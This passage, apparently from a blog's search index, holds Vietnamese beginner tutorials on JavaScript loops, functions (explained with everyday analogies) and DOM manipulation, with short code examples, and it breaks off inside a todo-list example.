để tạo mảng mới (immutable style) #arr = arr.filter((x) =\u0026gt; x \u0026gt;= threshold); 10.3 Lưu index cần xóa rồi xóa sau (khi muốn mark-first) #const toRemove = []; for (let i = 0; i \u0026lt; arr.length; i++) { if (shouldRemove(arr[i])) toRemove.push(i); } for (let idx of toRemove.reverse()) arr.splice(idx, 1); 10.4 Tránh dùng shift() trong vòng lặp lớn #shift() di chuyển toàn bộ mảng (O(n)), gây chậm nếu lặp nhiều lần.\n11. Async trong vòng lặp: tuần tự vs song song #11.1 Vấn đề thường gặp # Dùng forEach với async không chờ await tuần tự. urls.forEach(async (url) =\u0026gt; { const res = await fetch(url); // sẽ không chờ ở ngoài }); console.log(\u0026#34;Xong!\u0026#34;); // In ra \u0026#34;Xong!\u0026#34; ngay lập tức, dù các fetch() còn đang chạy. 11.2 Thực thi tuần tự (order important) #Chờ hoàn thành toàn bộ bước hiện tại rồi mới tiếp tục sang bước kế tiếp.\nconst urls = [\u0026#34;https://example.com/file1.txt\u0026#34;, \u0026#34;https://example.com/file2.txt\u0026#34;]; for (const url of urls) { const res = await fetch(url); console.log(await res.text()); } console.log(\u0026#34;Tất cả đã xong!\u0026#34;); // Nội dung file1.txt // Nội dung file2.txt // Tất cả đã xong! 11.3 Thực thi song song (tất cả cùng lúc, chờ tất cả) #const urls = [ \u0026#34;https://example.com/a.txt\u0026#34;, \u0026#34;https://example.com/b.txt\u0026#34;, \u0026#34;https://example.com/c.txt\u0026#34;, ]; const promises = urls.map((url) =\u0026gt; fetch(url)); const results = await Promise.all(promises); for (const res of results) { console.log(await res.text()); } // Nội dung file A // Nội dung file B // Nội dung file C // =\u0026gt; Tất cả request đều chạy song song → nhanh hơn nhiều so với for...of + await. 12. Generators / Iterators (nhắc qua) #Generators (function*) tạo iterator, cung cấp cách lazy iterate, hữu ích khi data lớn hoặc stream-like:\nfunction* idGen() { let id = 1; while (true) yield id++; } const g = idGen(); console.log(g.next().value); // 1 console.log(g.next().value); // 2 13. Tóm tắt nhanh #Tổng hợp các loại vòng lặp trong JavaScript # Loại vòng lặp Đặc điểm chính Khi nên dùng while Kiểm tra điều kiện trước khi chạy (check-first) Khi chưa biết trước số lần lặp do...while Chạy ít nhất 1 lần rồi mới kiểm tra (run-first) Khi cần thực thi ít nhất 1 lần for Dựa trên chỉ số (index) Khi cần kiểm soát số vòng hoặc truy cập mảng theo chỉ số for...of Duyệt giá trị của iterable (array, string, map, set) Khi cần đọc giá trị, hỗ trợ await, break, continue for...in Duyệt key của object Khi cần duyệt thuộc tính (nhớ dùng hasOwnProperty) forEach / map / filter / reduce Cú pháp hàm bậc cao (functional) Khi cần viết ngắn gọn, dễ đọc; không dừng được bằng break Xóa phần tử Lặp ngược (for (let i = arr.length - 1; i \u0026gt;= 0; i--)) hoặc dùng filter() Để tránh lỗi khi thay đổi mảng khi đang lặp Bất đồng bộ (async) for...of + await → chạy tuần tự\nPromise.all() → chạy song song Chọn tùy mục đích: cần thứ tự hay tốc độ Ghi nhớ nhanh: # while – kiểm tra trước\ndo...while – chạy trước rồi kiểm tra\nfor – theo chỉ số\nfor...of – theo giá trị\nfor...in – theo key\nforEach – không dừng/await được\nasync – tuần tự (for...of), song song (Promise.all)\n","date":"14 October 2025","permalink":"http://localhost:1313/posts/vong-lap/","section":"Posts","summary":"","title":"Vòng Lập (Loops)"},{"content":"Hàm trong JavaScript giống như những cỗ máy nhỏ bạn tạo ra để làm một việc cụ thể, như tính toán, in lời chào, hoặc xử lý dữ liệu. Hãy tưởng tượng tôi đang kể chuyện cho một người bạn chưa biết gì về lập trình. Tôi sẽ dùng ví dụ đời thường, chia nhỏ từng khái niệm, và vẽ một bức tranh tổng thể để bạn dễ hình dung.\n1. Hàm là gì? #Hãy nghĩ về hàm như một máy xay sinh tố trong bếp. Bạn bỏ nguyên liệu vào (như chuối, sữa), máy xay làm việc, và cho ra sinh tố. Hàm trong JavaScript cũng vậy: nó nhận đầu vào (nếu có), làm gì đó, và trả đầu ra (nếu cần). Giải thích đơn giản:\nHàm là một khối mã làm một việc cụ thể, như tính tổng hai số hoặc in \u0026ldquo;Xin chào\u0026rdquo;. Bạn có thể gọi lại hàm nhiều lần, tiết kiệm thời gian thay vì viết lại mã. Hàm có thể có tên (như tinhTong) hoặc không tên (hàm ẩn danh, dùng một lần). Ví dụ đời thường: Bạn có công thức làm bánh: trộn bột, đường, trứng, rồi nướng. Thay vì viết lại công thức mỗi lần làm bánh, bạn ghi vào sổ (hàm) và chỉ cần mở sổ ra làm theo.\nVí dụ code:\nfunction chaoHoi() { console.log(\u0026#34;Xin chào!\u0026#34;); } chaoHoi(); // In: Xin chào! 2. Tại sao sử dụng hàm? #Tưởng tượng bạn phải lau nhà 10 lần một ngày. Thay vì lấy chổi, xô, nước mỗi lần, bạn chuẩn bị một bộ dụng cụ lau nhà và chỉ cần lấy ra dùng. Hàm giống bộ dụng cụ: làm một lần, dùng nhiều lần.\nGiải thích đơn giản:\nTiết kiệm công sức: Không phải viết lại mã giống nhau (như tính tổng giỏ hàng ở nhiều nơi). Dễ sửa: Chỉ sửa một chỗ (hàm) thay vì tìm khắp chương trình. Dễ hiểu: Mã ngắn gọn, rõ ràng, như chia công việc thành từng bước nhỏ. Dễ kiểm tra: Test một hàm nhỏ dễ hơn test cả chương trình lớn. Ví dụ đời thường: Tính trung bình nhiệt độ mỗi ngày. Thay vì viết lại phép tính cho từng ngày, dùng hàm để gọn gàng.\nVí dụ code:\n// Không dùng hàm (lặp lại, dài dòng) let day1 = [ 12, 12, 11, 11, 10, 9, 9, 10, 12, 13, 15, 18, 21, 24, 24, 23, 25, 25, 23, 21, 20, 19, 17, 16, ]; let sum = 0; for (let i = 0; i \u0026lt; day1.length; i++) { sum += day1[i]; } console.log(\u0026#34;Trung bình ngày 1: \u0026#34; + sum / day1.length); // Có hàm (gọn, tái sử dụng) function tinhTrungBinh(temps) { let sum = 0; for (let i = 0; i \u0026lt; temps.length; i++) { sum += temps[i]; } return sum / temps.length; } console.log(\u0026#34;Trung bình ngày 1: \u0026#34; + tinhTrungBinh(day1)); let day2 = [ 17, 16, 14, 12, 10, 10, 10, 11, 13, 14, 15, 17, 22, 27, 29, 29, 27, 26, 24, 21, 19, 18, 17, 16, ]; console.log(\u0026#34;Trung bình ngày 2: \u0026#34; + tinhTrungBinh(day2)); 3. Khai báo hàm #Viết công thức làm bánh vào sổ và đặt tên là \u0026ldquo;Làm Bánh Chuối\u0026rdquo;. Mỗi lần cần, bạn mở sổ và làm theo. Khai báo hàm giống như viết công thức và đặt tên.\nGiải thích đơn giản:\nDùng từ khóa function, đặt tên hàm, thêm ngoặc () cho đầu vào (nếu có), và {} chứa công việc. Hàm có thể hoist (gọi trước khi khai báo, như mở sổ trước khi viết công thức). Ví dụ code:\nfunction tinhBinhPhuong(so) { return so * so; } console.log(tinhBinhPhuong(5)); // In: 25 // Hoisting: Gọi trước vẫn được chaoHoi(\u0026#34;Alice\u0026#34;); function chaoHoi(ten) { console.log(\u0026#34;Xin chào, \u0026#34; + ten + \u0026#34;!\u0026#34;); } // In: Xin chào, Alice! 4. Gọi hàm #Khi bạn muốn làm bánh, bạn mở sổ và làm theo công thức. Gọi hàm giống như mở sổ và chạy công thức đó.\nGiải thích đơn giản:\nGọi hàm bằng cách viết tên hàm và () (có thể kèm đầu vào, gọi là đối số). Có thể gọi nhiều lần, ở bất kỳ đâu (vòng lặp, nút bấm, v.v.). Ví dụ code:\nfunction inSoChan(n) { console.log(\u0026#34;Số chẵn: \u0026#34; + n * 2); } for (let i = 1; i \u0026lt;= 3; i++) { inSoChan(i); // In: Số chẵn: 2, 4, 6 } 5. Biến cục bộ trong hàm #Khi làm bánh trong bếp, bạn dùng bát, đĩa riêng trong bếp đó. Xong việc, bạn rửa sạch, không ảnh hưởng đến bát đĩa ở phòng khách. Biến cục bộ giống bát đĩa trong bếp: chỉ dùng trong hàm.\nGiải thích đơn giản:\nBiến khai báo trong hàm (bằng let hoặc var) chỉ tồn tại trong hàm, không làm rối biến bên ngoài. Giữ hàm độc lập, tránh lỗi. Ví dụ code:\nfunction tinhTong() { let a = 5; // Chỉ tồn tại trong hàm let b = 10; console.log(a + b); } tinhTong(); // In: 15 // console.log(a); // Lỗi: a không tồn tại 6. Câu lệnh return #Máy xay sinh tố sau khi xay xong thì đổ sinh tố ra cốc (kết quả). return giống như đổ kết quả ra cho người gọi hàm.\nGiải thích đơn giản:\nreturn đưa kết quả từ hàm ra ngoài (như số, chuỗi, v.v.). Kết thúc hàm ngay lập tức. Nếu không return, hàm trả về undefined. Ví dụ code:\nfunction binhPhuong(x) { return x * x; } let ketQua = binhPhuong(4); console.log(ketQua); // In: 16 7. Tham số (Parameters) #Khi làm bánh, công thức yêu cầu \u0026ldquo;2 quả trứng, 100g đường\u0026rdquo;. Trứng và đường là tham số, bạn đưa vào khi làm bánh. Tham số giống nguyên liệu bạn đưa vào hàm.\nGiải thích đơn giản:\nTham số là biến trong ngoặc () của hàm, nhận giá trị (đối số) khi gọi. Có thể có giá trị mặc định (như thêm 0g đường nếu không đưa vào). Ví dụ code:\nfunction cong(a, b = 0) { return a + b; } console.log(cong(5)); // In: 5 (b = 0) console.log(cong(5, 3)); // In: 8 8. Shadowing #Trong bếp, bạn có một lọ \u0026ldquo;đường\u0026rdquo; riêng, không liên quan đến lọ \u0026ldquo;đường\u0026rdquo; ở phòng khách. Biến trong hàm có thể trùng tên với biến ngoài hàm, nhưng chúng riêng biệt.\nGiải thích đơn giản:\nBiến/tham số trong hàm che lấp (shadow) biến toàn cục cùng tên. Giúp hàm không làm rối biến bên ngoài. Ví dụ code:\nlet x = 100; function test(x) { console.log(x); // In giá trị tham số } test(50); // In: 50 console.log(x); // In: 100 (không bị thay đổi) 9. Kiểm tra tham số (Parameters Validation) #Trước khi làm bánh, bạn kiểm tra xem có đủ trứng không, trứng có tươi không. Kiểm tra tham số giống như kiểm nguyên liệu trước khi chạy hàm.\nGiải thích đơn giản:\nKiểm tra đầu vào để tránh lỗi (như chia cho 0, đầu vào không phải số). Có thể trả về lỗi hoặc giá trị mặc định. Ví dụ code:\nfunction tinhTrungBinh(temps) { if (!(temps instanceof Array)) return \u0026#34;Không phải mảng!\u0026#34;; let sum = 0; for (let i = 0; i \u0026lt; temps.length; i++) { if (typeof temps[i] !== \u0026#34;number\u0026#34;) return \u0026#34;Có phần tử không phải số!\u0026#34;; sum += temps[i]; } return sum / temps.length; } console.log(tinhTrungBinh(10)); // In: Không phải mảng! console.log(tinhTrungBinh([10, \u0026#34;20\u0026#34;])); // In: Có phần tử không phải số! console.log(tinhTrungBinh([10, 20, 30])); // In: 20 10. Đệ quy (Recursion) #Bạn chia một thanh chocolate lớn thành các mảnh nhỏ hơn, mỗi lần chia bạn gọi lại chính mình để chia mảnh nhỏ hơn nữa, cho đến khi không chia được. Đệ quy là hàm gọi lại chính nó với vấn đề nhỏ hơn.\nGiải thích đơn giản:\nHàm gọi chính nó với điều kiện dừng (base case) để tránh lặp vô hạn. Dùng cho bài toán chia nhỏ (như tính giai thừa, duyệt cây). Ví dụ code (giai thừa):\nfunction giaiThua(n) { if (n \u0026lt;= 1) return 1; // Điều kiện dừng return n * giaiThua(n - 1); // Gọi lại } console.log(giaiThua(6)); // In: 720 (6 * 5 * 4 * 3 * 2 * 1) Flowchart đệ quy:\ngiaiThua(6)\r-\u0026gt; 6 * giaiThua(5)\r-\u0026gt; 5 * giaiThua(4)\r-\u0026gt; 4 * giaiThua(3)\r-\u0026gt; 3 * giaiThua(2)\r-\u0026gt; 2 * giaiThua(1)\r-\u0026gt; 1 (dừng) 11. Hàm như thành viên hạng nhất (First-class Citizens) #Hàm giống như một món đồ bạn có thể cất vào hộp (biến), đưa cho người khác (truyền đối số), hoặc tạo ra từ máy khác (trả về từ hàm). Hàm được đối xử như bất kỳ giá trị nào (số, chuỗi).\nGiải thích đơn giản:\nHàm có thể: Lưu vào biến. Truyền vào hàm khác. Trả về từ hàm khác. Ví dụ code:\n// Lưu vào biến let sayHi = function () { console.log(\u0026#34;Xin chào!\u0026#34;); }; sayHi(); // In: Xin chào! // Truyền làm đối số function thucHien(phepTinh, a, b) { return phepTinh(a, b); } let cong = (x, y) =\u0026gt; x + y; console.log(thucHien(cong, 2, 3)); // In: 5 // Trả về hàm function taoBoDem() { let dem = 0; return function () { return ++dem; }; } let dem = taoBoDem(); console.log(dem()); // In: 1 console.log(dem()); // In: 2 12. Biểu thức hàm (Function Expressions) #Thay vì viết công thức làm bánh vào sổ lớn, bạn ghi vào tờ giấy nhỏ và dán lên tủ lạnh. Biểu thức hàm là hàm được gán vào biến, như tờ giấy.\nGiải thích đơn giản:\nHàm được khai báo như một biểu thức, gán vào biến. Không hoisted, phải khai báo trước khi dùng. Ví dụ code:\nlet cong = function (a, b) { return a + b; }; console.log(cong(10, 20)); // In: 30 // Hàm ẩn danh let tru = function (a, b) { return a - b; }; console.log(tru(20, 10)); // In: 10 13. Callbacks #Bạn nhờ bạn bè đi siêu thị mua đồ, dặn khi mua xong thì gọi lại để báo. Callback là hàm bạn đưa cho hàm khác, để nó gọi lại khi xong việc.\nGiải thích đơn giản:\nCallback là hàm được truyền vào hàm khác làm đối số, được gọi trong hàm đó. Ví dụ code:\nfunction xuLy(callback) { console.log(\u0026#34;Bắt đầu xử lý...\u0026#34;); callback(); console.log(\u0026#34;Kết thúc xử lý.\u0026#34;); } xuLy(function () { console.log(\u0026#34;Callback chạy!\u0026#34;); }); // In: // Bắt đầu xử lý... // Callback chạy! // Kết thúc xử lý. 14. Callbacks bất đồng bộ (Asynchronous Callbacks) #Bạn nhờ bạn bè mua đồ, nhưng không đứng đợi mà đi làm việc khác. Khi bạn bè mua xong, họ gọi lại. Callback bất đồng bộ chạy khi một việc (như tải dữ liệu) hoàn thành, không theo thứ tự mã.\nGiải thích đơn giản:\nCallback bất đồng bộ chạy dựa trên sự kiện (như chờ 1 giây, chờ API trả về). Thường dùng với setTimeout hoặc sự kiện như click chuột. Ví dụ code:\nfunction xuLyAsync(callback) { console.log(\u0026#34;Bắt đầu...\u0026#34;); setTimeout(callback, 1000); console.log(\u0026#34;Kết thúc.\u0026#34;); } xuLyAsync(function () { console.log(\u0026#34;Callback sau 1s\u0026#34;); }); // In: // Bắt đầu... // Kết thúc. // (1s sau) Callback sau 1s 15. setTimeout và setInterval #setTimeout giống như đặt đồng hồ báo thức để gọi bạn dậy sau 5 phút. setInterval giống đồng hồ kêu liên tục mỗi 5 phút cho đến khi bạn tắt.\nGiải thích đơn giản:\nsetTimeout(callback, ms): Chạy callback một lần sau ms mili-giây. setInterval(callback, ms): Chạy callback lặp lại mỗi ms mili-giây, dừng bằng clearInterval. Ví dụ code:\n// setInterval: Chạy lặp lại 5 lần, mỗi giây dừng bằng clearInterval function batDongHo() { let count = 0; let id = setInterval(function () { console.log(\u0026#34;Tick \u0026#34; + ++count); if (count \u0026gt;= 5) clearInterval(id); }, 1000); } batDongHo(); // In: Tick 1, Tick 2, ..., Tick 5 (mỗi tick cách 1s) // setTimeout: Chạy một lần sau 3 giây setTimeout(() =\u0026gt; { console.log(\u0026#34;Báo thức! Đã đến giờ dậy rồi \u0026#34;); }, 3000); // sau 3 giây // (Bạn đợi 3 giây) // Báo thức! Đã đến giờ dậy rồi 16. Arrow Functions #Arrow function giống như viết công thức làm bánh ngắn gọn trên một tờ giấy nhỏ, thay vì sổ lớn. Nó gọn hơn nhưng không thay đổi cách làm bánh.\nGiải thích đơn giản:\nArrow function (=\u0026gt;) là cách viết ngắn gọn của hàm. Không bind this riêng, phù hợp cho callback ngắn. Có thể bỏ {} và return nếu chỉ có một lệnh. Ví dụ code:\nlet cong = (a, b) =\u0026gt; a + b; console.log(cong(10, 20)); // In: 30 let kiemTraSo = (n) =\u0026gt; { if (n \u0026gt; 0) return \u0026#34;Dương\u0026#34;; return \u0026#34;Không dương\u0026#34;; }; console.log(kiemTraSo(5)); // In: Dương Kết luận và mẹo sử dụng # Hàm giúp mã gọn gàng, dễ sửa, dễ tái sử dụng. Dùng tham số mặc định và kiểm tra đầu vào để hàm an toàn. Đệ quy tốt cho bài toán chia nhỏ, nhưng cẩn thận stack overflow. Callback và arrow functions giúp xử lý bất đồng bộ và viết mã ngắn gọn. Mẹo: Đặt tên hàm rõ ràng (như tinhTong thay vì fn), giới hạn 3-5 tham số, dùng object nếu cần nhiều tham số. Flowchart tổng thể:\n[ Công việc lớn ] --\u0026gt; function tinhTong(a, b) --\u0026gt; [ Kết quả ]\r| |\r|--\u0026gt; Biến cục bộ |--\u0026gt; return\r|--\u0026gt; Tham số\r|--\u0026gt; Đệ quy (nếu có)\r|--\u0026gt; Callback (nếu bất đồng bộ) Tài liệu tham khảo # MDN Web Docs: Functions Eloquent JavaScript: Functions JavaScript.info: Functions ","date":"13 October 2025","permalink":"http://localhost:1313/posts/ham-feynmen/","section":"Posts","summary":"","title":" Hiểu Biết Hàm Trong JavaScript (Phương Pháp Feynman)"},{"content":"DOM (Document Object Model) trong JavaScript giống như một bản đồ ngôi nhà của trang web: nó biểu diễn mọi thứ trên trang (nút bấm, tiêu đề, hình ảnh) như các phòng, và bạn có thể vào từng phòng để xem, sửa, hoặc thêm đồ đạc.\n1. DOM là gì? #Hãy nghĩ trang web như một ngôi nhà, với các phòng là tiêu đề, hình ảnh, nút bấm. DOM là bản đồ ngôi nhà, giúp bạn tìm phòng (phần tử HTML), xem đồ đạc (nội dung), sửa đổi (thay màu tường), hoặc thêm phòng mới.\nGiải thích đơn giản:\nDOM (Document Object Model) là cách trình duyệt biểu diễn trang web thành một cây đối tượng mà JavaScript có thể tương tác. Mỗi thẻ HTML (như \u0026lt;div\u0026gt;, \u0026lt;p\u0026gt;) là một nút (node) trong cây. JavaScript dùng DOM để đọc, sửa, thêm, xóa phần tử trên trang. 1.1. So sánh DOM với trang web thật # Trang web thật: Bạn thấy giao diện (văn bản, ảnh) trên trình duyệt. DOM: Bản đồ ẩn mà trình duyệt tạo, chứa mọi thẻ HTML dưới dạng đối tượng. Ví dụ HTML:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1 id=\u0026#34;title\u0026#34;\u0026gt;Xin chào\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;text\u0026#34;\u0026gt;Đây là đoạn văn.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; DOM biểu diễn (cây đối tượng):\ndocument\r└── html\r├── head\r└── body\r├── h1#title (\u0026#34;Xin chào\u0026#34;)\r└── p.text (\u0026#34;Đây là đoạn văn.\u0026#34;) 1.2. Cấu trúc cây DOM # Root: document là gốc. Nodes: Element nodes: Thẻ HTML (\u0026lt;div\u0026gt;, \u0026lt;p\u0026gt;). Text nodes: Văn bản bên trong thẻ. Attribute nodes: Thuộc tính (như id, class). Minh họa: Flowchart cây DOM.\n[ document ]\r|\r└── [ html ]\r|\r├── [ head ]\r└── [ body ]\r|\r├── [ h1#title ] --\u0026gt; \u0026#34;Xin chào\u0026#34;\r└── [ p.text ] --\u0026gt; \u0026#34;Đây là đoạn văn.\u0026#34; 2. Tại sao cần DOM? #Bạn muốn thay đổi màu tường hoặc thêm ghế trong nhà. DOM giống như công cụ cho phép bạn sửa đổi ngôi nhà mà không cần xây lại.\nGiải thích đơn giản:\nTương tác động: Thay đổi nội dung, style, hoặc thêm phần tử mà không tải lại trang. Xử lý sự kiện: Phản hồi khi người dùng click, nhập text, di chuột. Tùy chỉnh giao diện: Tạo web động (như hiển thị danh sách sản phẩm). 2.1. Lợi ích trong phát triển web # Tăng tính tương tác: Form tự kiểm tra, nút bấm phản hồi. Tái sử dụng: Thêm/xóa phần tử (như thêm sản phẩm vào giỏ hàng). Dễ bảo trì: Thay đổi một chỗ, ảnh hưởng toàn trang. 2.2. Ví dụ thực tế (web động, game) # Web: Thay đổi tiêu đề khi người dùng đăng nhập. Game: Di chuyển nhân vật khi nhấn phím. Ví dụ code (thay đổi tiêu đề):\ndocument.getElementById(\u0026#34;title\u0026#34;).textContent = \u0026#34;Chào mừng bạn!\u0026#34;; 3. Cách truy cập DOM #Để sửa phòng, bạn phải tìm đúng phòng trong bản đồ. Truy cập DOM là tìm đúng phần tử HTML để thao tác.\nGiải thích đơn giản:\ndocument là điểm bắt đầu, như \u0026ldquo;cửa chính\u0026rdquo; của ngôi nhà. Dùng các phương thức để tìm phần tử theo id, class, tag, v.v. 3.1. document object #document là đối tượng toàn cục, đại diện toàn bộ trang web.\n3.2. Các phương thức tìm phần tử # getElementById(id): Tìm một phần tử duy nhất theo id. getElementsByClassName(class): Tìm danh sách phần tử theo class. getElementsByTagName(tag): Tìm theo tên thẻ (như div, p). querySelector(selector): Tìm phần tử đầu tiên khớp CSS selector. querySelectorAll(selector): Tìm tất cả phần tử khớp selector. Ví dụ code (HTML giả định):\n\u0026lt;div id=\u0026#34;main\u0026#34;\u0026gt;Chào bạn\u0026lt;/div\u0026gt; \u0026lt;p class=\u0026#34;text\u0026#34;\u0026gt;Đoạn văn 1\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;text\u0026#34;\u0026gt;Đoạn văn 2\u0026lt;/p\u0026gt; // Tìm theo id let main = document.getElementById(\u0026#34;main\u0026#34;); console.log(main.textContent); // In: Chào bạn // Tìm theo class let texts = document.getElementsByClassName(\u0026#34;text\u0026#34;); console.log(texts[0].textContent); // In: Đoạn văn 1 // Tìm theo tag let paragraphs = document.getElementsByTagName(\u0026#34;p\u0026#34;); console.log(paragraphs.length); // In: 2 // querySelector let firstText = document.querySelector(\u0026#34;.text\u0026#34;); console.log(firstText.textContent); // In: Đoạn văn 1 // querySelectorAll let allTexts = document.querySelectorAll(\u0026#34;.text\u0026#34;); allTexts.forEach((p) =\u0026gt; console.log(p.textContent)); // In: Đoạn văn 1, Đoạn văn 2 3.3. Bảng so sánh các phương thức tìm # Phương thức Trả về Khi nào dùng? Ví dụ getElementById 1 phần tử Tìm duy nhất bằng id #main getElementsByClassName HTMLCollection Tìm nhiều phần tử theo class .text getElementsByTagName HTMLCollection Tìm theo tên thẻ p querySelector 1 phần tử Tìm đầu tiên bằng CSS selector .text, #main p querySelectorAll NodeList Tìm tất cả bằng CSS selector .text, div \u0026gt; p Lưu ý: HTMLCollection tự động cập nhật, NodeList thì không.\n4. Thao tác với phần tử DOM #Khi tìm được phòng, bạn có thể sơn lại tường (style), thay đồ đạc (nội dung), hoặc thêm cửa mới (phần tử).\nGiải thích đơn giản:\nThay đổi nội dung (text/HTML). Sửa thuộc tính (như src, class). Thay đổi style (CSS). Thêm/xóa phần tử. 4.1. Truy cập nội dung (text, HTML) # textContent: Lấy/gán văn bản thuần. innerHTML: Lấy/gán HTML bên trong. Ví dụ code:\n\u0026lt;div id=\u0026#34;main\u0026#34;\u0026gt;Chào bạn\u0026lt;/div\u0026gt; let div = document.getElementById(\u0026#34;main\u0026#34;); div.textContent = \u0026#34;Xin chào thế giới!\u0026#34;; // Thay văn bản div.innerHTML = \u0026#34;\u0026lt;strong\u0026gt;Xin chào\u0026lt;/strong\u0026gt; thế giới!\u0026#34;; // Thêm HTML 4.2. Thay đổi thuộc tính (attribute) # getAttribute(name): Lấy giá trị thuộc tính. setAttribute(name, value): Đặt giá trị. Truy cập trực tiếp: element.id, element.className. Ví dụ code:\n\u0026lt;img id=\u0026#34;photo\u0026#34; src=\u0026#34;old.jpg\u0026#34; /\u0026gt; let img = document.getElementById(\u0026#34;photo\u0026#34;); console.log(img.getAttribute(\u0026#34;src\u0026#34;)); // In: old.jpg img.setAttribute(\u0026#34;src\u0026#34;, \u0026#34;new.jpg\u0026#34;); img.alt = \u0026#34;Ảnh mới\u0026#34;; // Truy cập trực tiếp 4.3. Thay đổi style (CSS) # style.tinhChat: Thay đổi style inline (camelCase). classList.add/remove/toggle: Quản lý class. Ví dụ code:\n\u0026lt;div id=\u0026#34;box\u0026#34;\u0026gt;Hộp\u0026lt;/div\u0026gt; let box = document.getElementById(\u0026#34;box\u0026#34;); box.style.backgroundColor = \u0026#34;blue\u0026#34;; // Thay màu nền box.classList.add(\u0026#34;highlight\u0026#34;); // Thêm class box.classList.toggle(\u0026#34;hidden\u0026#34;); // Bật/tắt class 4.4. Thêm/xóa phần tử # createElement(tag): Tạo phần tử mới. appendChild(node): Thêm con. removeChild(node): Xóa con. remove(): Xóa chính phần tử. Ví dụ code:\n\u0026lt;ul id=\u0026#34;list\u0026#34;\u0026gt;\u0026lt;/ul\u0026gt; let ul = document.getElementById(\u0026#34;list\u0026#34;); let li = document.createElement(\u0026#34;li\u0026#34;); li.textContent = \u0026#34;Mục mới\u0026#34;; ul.appendChild(li); // Thêm \u0026lt;li\u0026gt;Mục mới\u0026lt;/li\u0026gt; ul.removeChild(li); // Xóa 5. Xử lý sự kiện (Event Handling) #Sự kiện giống như khi bạn nhấn công tắc đèn (click), đèn sáng. DOM cho phép \u0026ldquo;lắng nghe\u0026rdquo; hành động người dùng.\nGiải thích đơn giản:\nSự kiện: Hành động như click, nhập text, di chuột,\u0026hellip; Thêm bằng addEventListener hoặc thuộc tính onclick. 5.1. Sự kiện là gì? #Các hành động người dùng (click, keydown) hoặc trình duyệt (load).\n5.2. Các cách thêm sự kiện # addEventListener(event, callback): Linh hoạt, thêm nhiều listener. element.onclick = function(): Gán trực tiếp, chỉ một listener. 5.3. Ví dụ: Click, input, mouseover #\u0026lt;button id=\u0026#34;btn\u0026#34;\u0026gt;Nhấn tôi\u0026lt;/button\u0026gt; \u0026lt;input id=\u0026#34;input\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt; \u0026lt;div id=\u0026#34;box\u0026#34;\u0026gt;Di chuột qua\u0026lt;/div\u0026gt; // Click let btn = document.getElementById(\u0026#34;btn\u0026#34;); btn.addEventListener(\u0026#34;click\u0026#34;, () =\u0026gt; { alert(\u0026#34;Bạn đã nhấn!\u0026#34;); }); // Input let input = document.getElementById(\u0026#34;input\u0026#34;); input.addEventListener(\u0026#34;input\u0026#34;, (e) =\u0026gt; { console.log(\u0026#34;Bạn nhập: \u0026#34; + e.target.value); }); // Mouseover let box = document.getElementById(\u0026#34;box\u0026#34;); box.addEventListener(\u0026#34;mouseover\u0026#34;, () =\u0026gt; { box.style.backgroundColor = \u0026#34;yellow\u0026#34;; }); 6. Duyệt cây DOM (DOM Traversal) #Duyệt DOM giống như đi bộ trong nhà, từ phòng khách (cha) đến phòng ngủ (con), hoặc sang phòng bên (anh em).\nGiải thích đơn giản:\nDi chuyển qua các node: cha (parentNode), con (children), anh em (nextSibling). 6.1. Di chuyển đến cha, con, anh em # parentNode: Lên cha. children: Danh sách con. firstElementChild, lastElementChild: Con đầu/cuối. nextElementSibling, previousElementSibling: Anh em kế tiếp/trước. 6.2. Ví dụ duyệt cây DOM #\u0026lt;div id=\u0026#34;parent\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Đoạn 1\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Đoạn 2\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; let parent = document.getElementById(\u0026#34;parent\u0026#34;); console.log(parent.firstElementChild.textContent); // In: Đoạn 1 console.log(parent.children[1].textContent); // In: Đoạn 2 console.log(parent.children[0].nextElementSibling.textContent); // In: Đoạn 2 Minh họa: Flowchart duyệt DOM.\n[ div#parent ]\r|\r├── [ p ] --\u0026gt; \u0026#34;Đoạn 1\u0026#34; (firstElementChild)\r└── [ p ] --\u0026gt; \u0026#34;Đoạn 2\u0026#34; (nextElementSibling) 7. DOM và hiệu suất #Nếu bạn sơn lại cả ngôi nhà mỗi lần muốn đổi màu một phòng, rất tốn công. Thao tác DOM nhiều lần làm chậm trang.\nGiải thích đơn giản:\nDOM thao tác trực tiếp trình duyệt, tốn tài nguyên. Truy cập DOM nhiều lần hoặc cập nhật liên tục gây lag. 7.1. Lỗi làm chậm trang # Lặp innerHTML trong vòng lặp lớn. Thêm từng phần tử riêng lẻ. 7.2. Cách tối ưu # DocumentFragment: Tạo các node tạm, thêm một lần. Cache DOM: Lưu kết quả truy cập vào biến. Batch update: Cập nhật style một lần. Ví dụ code (tối ưu):\n// Không tối ưu for (let i = 0; i \u0026lt; 1000; i++) { document.getElementById(\u0026#34;list\u0026#34;).innerHTML += \u0026#34;\u0026lt;li\u0026gt;Mục\u0026lt;/li\u0026gt;\u0026#34;; } // Tối ưu let fragment = document.createDocumentFragment(); for (let i = 0; i \u0026lt; 1000; i++) { let li = document.createElement(\u0026#34;li\u0026#34;); li.textContent = \u0026#34;Mục\u0026#34;; fragment.appendChild(li); } document.getElementById(\u0026#34;list\u0026#34;).appendChild(fragment); 8. DOM ảo (Virtual DOM) và so sánh #DOM thật giống sửa nhà trực tiếp (chậm). Virtual DOM giống như vẽ bản sửa đổi trên giấy, rồi áp dụng một lần (nhanh).\nGiải thích đơn giản:\nVirtual DOM: Bản sao DOM trong bộ nhớ (React, Vue dùng). So sánh Virtual DOM với DOM thật, chỉ cập nhật thay đổi. 8.1. Virtual DOM là gì? #Bản sao nhẹ của DOM, tính toán thay đổi trước khi áp dụng.\n8.2. So sánh với DOM thật # Tiêu chí DOM thật Virtual DOM Tốc độ Chậm (truy cập trình duyệt) Nhanh (trong bộ nhớ) Cập nhật Toàn bộ cây DOM Chỉ phần thay đổi Dùng trong Vanilla JS React, Vue 9. Ứng dụng thực tế #9.1. Xây dựng todo list động #HTML:\n\u0026lt;input id=\u0026#34;input\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt; \u0026lt;button id=\u0026#34;add\u0026#34;\u0026gt;Thêm\u0026lt;/button\u0026gt; \u0026lt;ul 